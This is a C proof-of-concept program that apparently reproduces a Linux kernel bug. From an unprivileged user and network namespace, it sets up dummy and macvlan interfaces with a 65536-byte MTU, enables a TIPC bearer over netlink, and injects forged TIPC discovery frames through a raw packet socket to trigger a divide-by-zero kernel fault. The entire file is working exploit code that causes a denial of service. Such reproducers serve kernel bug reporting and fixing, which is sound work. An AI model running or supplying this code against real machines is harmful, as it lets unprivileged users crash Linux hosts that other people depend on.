// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <time.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/genetlink.h>
#include <linux/if.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/if_link.h>

#ifndef IFLA_MACVLAN_MODE
#define IFLA_MACVLAN_MODE 1
#endif
#define MACVLAN_MODE_BRIDGE 4

#ifndef ETH_P_TIPC
#define ETH_P_TIPC 0x88CA
#endif

#define TIPC_GENL_V2_NAME "TIPCv2"
#define TIPC_GENL_V2_VERSION 0x1

#define TIPC_NL_BEARER_ENABLE 3
#define TIPC_NL_NET_SET 15

#define TIPC_NLA_BEARER 1
#define TIPC_NLA_NET 7

#define TIPC_NLA_BEARER_NAME 1

#define TIPC_NLA_NET_ADDR 2

#define MAX_H_SIZE 60
#define NODE_ID_LEN 16
#define TIPC_MSG_LEN (MAX_H_SIZE + NODE_ID_LEN)
#define MEDIA_INFO_OFF 20
#define MEDIA_TYPE_OFF (MEDIA_INFO_OFF + 3)
#define MEDIA_ADDR_OFF (MEDIA_INFO_OFF + 4)

#define SELF_ADDR 0x01001001u
#define PEER_ADDR 0x01001002u
#define BIG_MTU 65536

static int rtnl_fd = -1, genl_fd = -1;
static unsigned seq = 1;
static char nlbuf[8192];

static void die(const char *m)
{
	fprintf(stderr, "[-] %s: %s\n", m, strerror(errno));
	exit(1);
}

static void *nl_start(int type, int flags, size_t payload)
{
	struct nlmsghdr *n = (struct nlmsghdr *)nlbuf;

	memset(nlbuf, 0, sizeof(nlbuf));
	n->nlmsg_len = NLMSG_LENGTH(payload);
	n->nlmsg_type = type;
	n->nlmsg_flags = flags;
	n->nlmsg_seq = ++seq;
	n->nlmsg_pid = 0;
	return NLMSG_DATA(n);
}

static struct rtattr *nl_put(int type, const void *data, int len)
{
	struct nlmsghdr *n = (struct nlmsghdr *)nlbuf;
	struct rtattr *rta = (struct rtattr *)(nlbuf + NLMSG_ALIGN(n->nlmsg_len));

	rta->rta_type = type;
	rta->rta_len = RTA_LENGTH(len);
	if (data && len)
		memcpy(RTA_DATA(rta), data, len);
	n->nlmsg_len = NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(rta->rta_len);
	return rta;
}

static struct rtattr *nl_put_u32(int type, unsigned v)
{
	return nl_put(type, &v, 4);
}

static struct rtattr *nl_nest(int type)
{
	return nl_put(type | NLA_F_NESTED, NULL, 0);
}

static void nl_nest_end(struct rtattr *nest)
{
	struct nlmsghdr *n = (struct nlmsghdr *)nlbuf;

	nest->rta_len = (char *)nlbuf + n->nlmsg_len - (char *)nest;
}

static int nl_talk(int fd)
{
	struct sockaddr_nl sa;
	struct nlmsghdr *n = (struct nlmsghdr *)nlbuf;
	static char rbuf[16384];
	int len;

	memset(&sa, 0, sizeof(sa));
	sa.nl_family = AF_NETLINK;
	if (sendto(fd, nlbuf, n->nlmsg_len, 0, (struct sockaddr *)&sa,
		   sizeof(sa)) < 0)
		return -errno;

	len = recv(fd, rbuf, sizeof(rbuf), 0);
	if (len < 0)
		return -errno;

	for (struct nlmsghdr *h = (struct nlmsghdr *)rbuf; NLMSG_OK(h, len);
	     h = NLMSG_NEXT(h, len)) {
		if (h->nlmsg_type == NLMSG_ERROR)
			return ((struct nlmsgerr *)NLMSG_DATA(h))->error;
	}
	return 0;
}

static int nl_open(int proto)
{
	struct sockaddr_nl sa;
	int fd = socket(AF_NETLINK, SOCK_RAW, proto);

	if (fd < 0)
		die("netlink socket");
	memset(&sa, 0, sizeof(sa));
	sa.nl_family = AF_NETLINK;
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		die("netlink bind");
	return fd;
}

static int link_add_dummy(const char *name, unsigned mtu)
{
	struct ifinfomsg *ifi;
	struct rtattr *li;

	ifi = nl_start(RTM_NEWLINK,
		       NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK,
		       sizeof(*ifi));
	ifi->ifi_family = AF_UNSPEC;
	nl_put(IFLA_IFNAME, name, strlen(name) + 1);
	nl_put_u32(IFLA_MTU, mtu);
	li = nl_nest(IFLA_LINKINFO);
	nl_put(IFLA_INFO_KIND, "dummy", 6);
	nl_nest_end(li);
	return nl_talk(rtnl_fd);
}

static int link_add_macvlan(const char *name, int link_idx)
{
	struct ifinfomsg *ifi;
	struct rtattr *li, *data;

	ifi = nl_start(RTM_NEWLINK,
		       NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK,
		       sizeof(*ifi));
	ifi->ifi_family = AF_UNSPEC;
	nl_put(IFLA_IFNAME, name, strlen(name) + 1);
	nl_put_u32(IFLA_LINK, link_idx);
	li = nl_nest(IFLA_LINKINFO);
	nl_put(IFLA_INFO_KIND, "macvlan", 8);
	data = nl_nest(IFLA_INFO_DATA);
	nl_put_u32(IFLA_MACVLAN_MODE, MACVLAN_MODE_BRIDGE);
	nl_nest_end(data);
	nl_nest_end(li);
	return nl_talk(rtnl_fd);
}

static int ifidx(const char *name)
{
	struct ifreq ifr;
	int fd = socket(AF_INET, SOCK_DGRAM, 0);

	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
		die("SIOCGIFINDEX");
	close(fd);
	return ifr.ifr_ifindex;
}

static void ifmac(const char *name, unsigned char *mac)
{
	struct ifreq ifr;
	int fd = socket(AF_INET, SOCK_DGRAM, 0);

	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
		die("SIOCGIFHWADDR");
	memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
	close(fd);
}

static void ifup(const char *name, int promisc)
{
	struct ifreq ifr;
	int fd = socket(AF_INET, SOCK_DGRAM, 0);

	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0)
		die("SIOCGIFFLAGS");
	ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
	if (promisc)
		ifr.ifr_flags |= IFF_PROMISC | IFF_ALLMULTI;
	if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0)
		die("SIOCSIFFLAGS");
	close(fd);
}

static int ifmtu_get(const char *name)
{
	struct ifreq ifr;
	int fd = socket(AF_INET, SOCK_DGRAM, 0);

	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFMTU, &ifr) < 0)
		die("SIOCGIFMTU");
	close(fd);
	return ifr.ifr_mtu;
}

static int ifmtu_set(const char *name, int mtu)
{
	struct ifreq ifr;
	int fd = socket(AF_INET, SOCK_DGRAM, 0), r;

	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
	ifr.ifr_mtu = mtu;
	r = ioctl(fd, SIOCSIFMTU, &ifr);
	close(fd);
	return r;
}

static int tipc_family(void)
{
	struct genlmsghdr *g;
	struct sockaddr_nl sa;
	static char rbuf[8192];
	int len;

	g = nl_start(GENL_ID_CTRL, NLM_F_REQUEST, GENL_HDRLEN);
	g->cmd = CTRL_CMD_GETFAMILY;
	g->version = 1;
	nl_put(CTRL_ATTR_FAMILY_NAME, TIPC_GENL_V2_NAME,
	       strlen(TIPC_GENL_V2_NAME) + 1);

	memset(&sa, 0, sizeof(sa));
	sa.nl_family = AF_NETLINK;
	if (sendto(genl_fd, nlbuf, ((struct nlmsghdr *)nlbuf)->nlmsg_len, 0,
		   (struct sockaddr *)&sa, sizeof(sa)) < 0)
		die("genl send");
	len = recv(genl_fd, rbuf, sizeof(rbuf), 0);
	if (len < 0)
		die("genl recv");

	for (struct nlmsghdr *h = (struct nlmsghdr *)rbuf; NLMSG_OK(h, len);
	     h = NLMSG_NEXT(h, len)) {
		struct rtattr *rta;
		int rlen;

		if (h->nlmsg_type == NLMSG_ERROR)
			return -1;
		rta = (struct rtattr *)((char *)NLMSG_DATA(h) + GENL_HDRLEN);
		rlen = NLMSG_PAYLOAD(h, 0) - GENL_HDRLEN;
		for (; RTA_OK(rta, rlen); rta = RTA_NEXT(rta, rlen)) {
			if ((rta->rta_type & NLA_TYPE_MASK) ==
			    CTRL_ATTR_FAMILY_ID)
				return *(unsigned short *)RTA_DATA(rta);
		}
	}
	return -1;
}

static void *tipc_start(int fam, int cmd)
{
	struct genlmsghdr *g;

	g = nl_start(fam, NLM_F_REQUEST | NLM_F_ACK, GENL_HDRLEN);
	g->cmd = cmd;
	g->version = TIPC_GENL_V2_VERSION;
	return g;
}

static void write_file(const char *path, const char *s)
{
	int fd = open(path, O_WRONLY);

	if (fd < 0)
		return;
	if (write(fd, s, strlen(s)) < 0)
		;
	close(fd);
}

static int enter_ns(int drop)
{
	char buf[128];
	uid_t uid;
	gid_t gid;

	if (drop && getuid() == 0) {
		if (setgid(1000) || setuid(1000))
			return -1;

		prctl(PR_SET_DUMPABLE, 1, 0, 0, 0);
	}
	uid = getuid();
	gid = getgid();

	if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
		perror("unshare(CLONE_NEWUSER|CLONE_NEWNET)");
		return -1;
	}
	write_file("/proc/self/setgroups", "deny");
	snprintf(buf, sizeof(buf), "0 %d 1", uid);
	write_file("/proc/self/uid_map", buf);
	snprintf(buf, sizeof(buf), "0 %d 1", gid);
	write_file("/proc/self/gid_map", buf);
	printf("[*] userns+netns: uid=%d euid=%d\n", getuid(), geteuid());
	if (geteuid() != 0) {
		fprintf(stderr, "[-] uid_map not applied\n");
		return -1;
	}
	return 0;
}

static int run(void)
{
	unsigned char mac0[6], mac1[6];
	unsigned char frame[2048];
	struct sockaddr_ll sll;
	int idx_dummy, idx_mv0, idx_mv1;
	int fam, pkt, n, r, tries;

	setvbuf(stdout, NULL, _IONBF, 0);
	printf("[*] TIPC u16 link mtu truncation -> divide-by-zero PoC\n");

	rtnl_fd = nl_open(NETLINK_ROUTE);
	genl_fd = nl_open(NETLINK_GENERIC);

	r = link_add_dummy("dummy0", BIG_MTU);
	if (r) {

		r = link_add_dummy("dummy0", 1500);
		if (r) {
			fprintf(stderr, "[-] dummy0 create: %s\n", strerror(-r));
			return 1;
		}
		if (ifmtu_set("dummy0", BIG_MTU) < 0)
			die("set dummy0 mtu");
	}
	idx_dummy = ifidx("dummy0");
	ifup("dummy0", 1);
	printf("[+] dummy0 idx=%d mtu=%d\n", idx_dummy, ifmtu_get("dummy0"));

	r = link_add_macvlan("mv0", idx_dummy);
	if (r) {
		fprintf(stderr, "[-] mv0: %s\n", strerror(-r));
		return 1;
	}
	r = link_add_macvlan("mv1", idx_dummy);
	if (r) {
		fprintf(stderr, "[-] mv1: %s\n", strerror(-r));
		return 1;
	}
	if (ifmtu_get("mv0") != BIG_MTU)
		ifmtu_set("mv0", BIG_MTU);
	if (ifmtu_get("mv1") != BIG_MTU)
		ifmtu_set("mv1", BIG_MTU);
	ifup("mv0", 1);
	ifup("mv1", 1);
	idx_mv0 = ifidx("mv0");
	idx_mv1 = ifidx("mv1");
	ifmac("mv0", mac0);
	ifmac("mv1", mac1);
	printf("[+] mv0 idx=%d mtu=%d  mv1 idx=%d mtu=%d\n",
	       idx_mv0, ifmtu_get("mv0"), idx_mv1, ifmtu_get("mv1"));
	if (ifmtu_get("mv1") != BIG_MTU) {
		fprintf(stderr, "[-] could not give mv1 an mtu of %d\n", BIG_MTU);
		return 1;
	}

	fam = tipc_family();
	if (fam < 0) {
		fprintf(stderr, "[-] TIPCv2 genl family not found\n");
		return 1;
	}
	printf("[+] TIPCv2 family id %d\n", fam);

	{
		struct rtattr *nest;

		tipc_start(fam, TIPC_NL_NET_SET);
		nest = nl_nest(TIPC_NLA_NET);
		nl_put_u32(TIPC_NLA_NET_ADDR, SELF_ADDR);
		nl_nest_end(nest);
		r = nl_talk(genl_fd);
		printf("[%c] TIPC_NL_NET_SET addr=0x%x -> %d\n",
		       r ? '-' : '+', SELF_ADDR, r);
	}
	{
		struct rtattr *nest;

		tipc_start(fam, TIPC_NL_BEARER_ENABLE);
		nest = nl_nest(TIPC_NLA_BEARER);
		nl_put(TIPC_NLA_BEARER_NAME, "eth:mv1", 8);
		nl_nest_end(nest);
		r = nl_talk(genl_fd);
		printf("[%c] TIPC_NL_BEARER_ENABLE eth:mv1 -> %d\n",
		       r ? '-' : '+', r);
		if (r) {
			fprintf(stderr, "[-] bearer enable failed: %s\n",
				strerror(-r));
			return 1;
		}
	}

	pkt = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_TIPC));
	if (pkt < 0)
		die("AF_PACKET");
	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_TIPC);
	sll.sll_ifindex = idx_mv0;
	if (bind(pkt, (struct sockaddr *)&sll, sizeof(sll)) < 0)
		die("bind AF_PACKET");

	printf("[*] waiting for a TIPC discovery frame on mv0 ...\n");
	n = -1;
	for (tries = 0; tries < 60; tries++) {
		struct timeval tv = { .tv_sec = 1, .tv_usec = 0 };

		setsockopt(pkt, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
		n = recv(pkt, frame, sizeof(frame), 0);
		if (n >= (int)(ETH_HLEN + TIPC_MSG_LEN))
			break;
		n = -1;
	}
	if (n < 0) {
		fprintf(stderr, "[-] no TIPC discovery frame captured\n");
		return 1;
	}
	printf("[+] captured %d byte TIPC frame\n", n);

	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_TIPC);
	sll.sll_ifindex = idx_mv0;
	sll.sll_halen = ETH_ALEN;
	memset(sll.sll_addr, 0xff, ETH_ALEN);

	for (tries = 0; tries < 8; tries++) {
		unsigned char *msg = frame + ETH_HLEN;
		unsigned peer = PEER_ADDR + tries;
		unsigned be;

		memset(frame, 0xff, 6);
		memcpy(frame + 6, mac0, 6);

		be = htonl(peer);
		memcpy(msg + 12, &be, 4);

		msg[MEDIA_TYPE_OFF] = 1;
		memcpy(msg + MEDIA_ADDR_OFF, mac0, 6);
		memset(msg + MEDIA_ADDR_OFF + 6, 0, 26 - 6);

		memset(msg + MAX_H_SIZE, 0, NODE_ID_LEN);
		snprintf((char *)msg + MAX_H_SIZE, NODE_ID_LEN, "%x", peer);

		printf("[*] injecting discovery from node 0x%x (b->mtu=%d, "
		       "l->mtu=%d)\n", peer, BIG_MTU, BIG_MTU & 0xffff);
		if (sendto(pkt, frame, n, 0, (struct sockaddr *)&sll,
			   sizeof(sll)) < 0)
			perror("sendto");
		usleep(300000);
	}

	printf("[-] survived; the kernel did not fault\n");
	return 3;
}

int main(void)
{
	pid_t pid;
	int st = 1;

	setvbuf(stdout, NULL, _IONBF, 0);

	pid = fork();
	if (pid == 0) {
		if (enter_ns(1))
			_exit(2);
		_exit(run());
	}
	if (pid > 0)
		waitpid(pid, &st, 0);

	if (WIFEXITED(st) && WEXITSTATUS(st) == 0)
		return 0;

	fprintf(stderr,
		"[!] unprivileged attempt did not complete (status %d); "
		"retrying without dropping uid\n", st);
	if (enter_ns(0))
		return 1;
	return run();
}
